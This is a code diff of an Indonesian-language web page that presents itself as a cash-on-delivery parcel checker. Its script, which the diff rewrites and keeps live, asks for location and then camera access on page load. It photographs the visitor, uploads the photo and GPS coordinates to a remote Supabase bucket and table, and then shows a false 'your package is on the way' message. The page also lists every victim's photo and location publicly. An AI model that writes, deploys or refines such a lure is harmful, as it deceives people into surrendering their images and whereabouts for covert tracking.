@@ -8,7 +8,6 @@
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-
   body {
     font-family: 'Poppins', sans-serif;
     background: #f9f9f9;
@@ -18,7 +17,6 @@
     flex-direction: column;
     align-items: center;
   }
-
   header {
     background-color: #f53d2d;
     color: #fff;
@@ -33,7 +31,6 @@
     z-index: 100;
     user-select: none;
   }
-
   #status {
     margin: 20px auto;
     padding: 14px 20px;
@@ -50,76 +47,34 @@
     user-select: none;
     text-align: center;
   }
-
   /* Loading animasi */
-  .loading {
-    display: inline-flex;
-    gap: 6px;
-    width: 80px;
-    height: 20px;
-    position: relative;
-  }
+  .loading { display: inline-flex; gap: 6px; width: 80px; height: 20px; }
   .loading div {
-    width: 14px;
-    height: 14px;
-    border-radius: 50%;
-    background: #f53d2d;
+    width: 14px; height: 14px; border-radius: 50%; background: #f53d2d;
     animation-timing-function: cubic-bezier(0, 1, 1, 0);
-    position: relative;
   }
   .loading div:nth-child(1) { animation: loading1 0.6s infinite; }
   .loading div:nth-child(2) { animation: loading2 0.6s infinite; animation-delay: 0.15s; }
   .loading div:nth-child(3) { animation: loading2 0.6s infinite; animation-delay: 0.3s; }
   .loading div:nth-child(4) { animation: loading3 0.6s infinite; animation-delay: 0.45s; }
-
   @keyframes loading1 { 0% { transform: scale(0); } 100% { transform: scale(1); } }
   @keyframes loading2 { 0% { transform: translateX(0); } 100% { transform: translateX(24px); } }
   @keyframes loading3 { 0% { transform: scale(1); } 100% { transform: scale(0); } }
-
   #list {
-    width: 100%;
-    max-width: 960px;
-    margin: 0 auto 40px;
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
-    gap: 20px;
-    padding: 0 16px;
+    width: 100%; max-width: 960px; margin: 0 auto 40px;
+    display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+    gap: 20px; padding: 0 16px;
   }
-
   .card {
-    background: #fff;
-    border-radius: 20px;
+    background: #fff; border-radius: 20px;
     box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-    overflow: hidden;
-    cursor: pointer;
+    overflow: hidden; cursor: pointer;
     transition: transform 0.3s ease, box-shadow 0.3s ease;
-    display: flex;
-    flex-direction: column;
-    user-select: none;
+    display: flex; flex-direction: column;
   }
-
-  .card:hover {
-    transform: translateY(-6px);
-    box-shadow: 0 12px 24px rgba(245, 61, 45, 0.25);
-  }
-
-  .card img {
-    width: 100%;
-    height: 140px;
-    object-fit: cover;
-    border-bottom: 1px solid #eee;
-    flex-shrink: 0;
-    border-radius: 12px 12px 0 0;
-  }
-
-  .info {
-    padding: 12px 14px;
-    font-size: 0.9rem;
-    color: #666;
-    white-space: pre-line;
-    flex-grow: 1;
-  }
-
+  .card:hover { transform: translateY(-6px); box-shadow: 0 12px 24px rgba(245,61,45,0.25); }
+  .card img { width: 100%; height: 140px; object-fit: cover; border-bottom: 1px solid #eee; }
+  .info { padding: 12px 14px; font-size: 0.9rem; color: #666; white-space: pre-line; }
   @media (max-width: 480px) {
     #list { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 16px; }
     .card img { height: 120px; }
@@ -130,9 +85,7 @@
 <header>CEK PAKET COD MU DISINI</header>
 
 <div id="status">
-  <div class="loading">
-    <div></div><div></div><div></div><div></div>
-  </div>
+  <div class="loading"><div></div><div></div><div></div><div></div></div>
   <span> Sedang diproses...</span>
 </div>
 
@@ -149,42 +102,7 @@
   const statusEl = document.getElementById("status");
   const listEl = document.getElementById("list");
 
-  async function ambilFoto() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const track = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(track);
-      const blob = await imageCapture.takePhoto();
-      const fileName = `foto_${Date.now()}.jpg`;
-
-      const { error } = await client.storage
-        .from(BUCKET)
-        .upload(fileName, blob, {
-          cacheControl: "3600",
-          upsert: false,
-          contentType: "image/jpeg"
-        });
-
-      if (error) {
-        statusEl.style.background = "#ffebee";
-        statusEl.style.color = "#d32f2f";
-        statusEl.innerText = "❌ Gagal upload: " + error.message;
-      } else {
-        statusEl.style.background = "#e8f5e9";
-        statusEl.style.color = "#388e3c";
-        statusEl.innerText = "✅ aktifkan izin lokasi";
-        ambilLokasi(fileName);
-      }
-
-      track.stop();
-    } catch (err) {
-      statusEl.style.background = "#ffebee";
-      statusEl.style.color = "#d32f2f";
-      statusEl.innerText = "❌ aktifkan izin: " + err;
-    }
-  }
-
-  function ambilLokasi(fotoName) {
+  function ambilLokasiDulu() {
     if (!navigator.geolocation) {
       statusEl.innerText = "❌ Browser tidak mendukung geolocation";
       return;
@@ -193,27 +111,48 @@
     navigator.geolocation.getCurrentPosition(async (pos) => {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
-
-      const { error } = await client
-        .from("lokasi_users")
-        .insert([{ foto: fotoName, latitude: lat, longitude: lon, created_at: new Date() }]);
-
-      if (error) {
-        statusEl.innerText = "❌ aktifkan izin lokasi: " + error.message;
-      } else {
-        statusEl.innerText = "✅ Oke paket COD mu otw dianter";
-        tampilkanFoto();
-      }
+      statusEl.innerText = "✅ Lokasi berhasil, ambil foto...";
+      ambilFoto(lat, lon);
     }, (err) => {
       statusEl.innerText = "❌ aktifkan izin lokasi: " + err.message;
     });
+  }
+
+  async function ambilFoto(lat, lon) {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      const blob = await imageCapture.takePhoto();
+      const fileName = `foto_${Date.now()}.jpg`;
+
+      const { error: uploadError } = await client.storage
+        .from(BUCKET)
+        .upload(fileName, blob, {
+          cacheControl: "3600",
+          upsert: false,
+          contentType: "image/jpeg"
+        });
+
+      if (uploadError) {
+        statusEl.innerText = "❌ Gagal upload: " + uploadError.message;
+      } else {
+        await client.from("lokasi_users").insert([
+          { foto: fileName, latitude: lat, longitude: lon, created_at: new Date() }
+        ]);
+        statusEl.innerText = "✅ Oke paket COD mu otw dianter";
+        tampilkanFoto();
+      }
+      track.stop();
+    } catch (err) {
+      statusEl.innerText = "❌ aktifkan izin kamera: " + err;
+    }
   }
 
   async function tampilkanFoto() {
     const { data, error } = await client.storage.from(BUCKET).list("", {
       sortBy: { column: "created_at", order: "desc" }
     });
-
     if (error) {
       listEl.innerHTML = "<p style='color:red;'>Gagal ambil daftar foto</p>";
       return;
@@ -230,10 +169,8 @@
 
       const card = document.createElement("div");
       card.className = "card";
-
       const img = document.createElement("img");
       img.src = publicUrl.publicUrl;
-
       const info = document.createElement("div");
       info.className = "info";
       if (lokasiData) {
@@ -241,15 +178,14 @@
       } else {
         info.innerText = "Lokasi tidak tersedia";
       }
-
       card.appendChild(img);
       card.appendChild(info);
       listEl.appendChild(card);
     }
   }
 
-  ambilFoto();
+  // mulai: minta lokasi dulu
+  ambilLokasiDulu();
 </script>
 </body>
 </html>
-
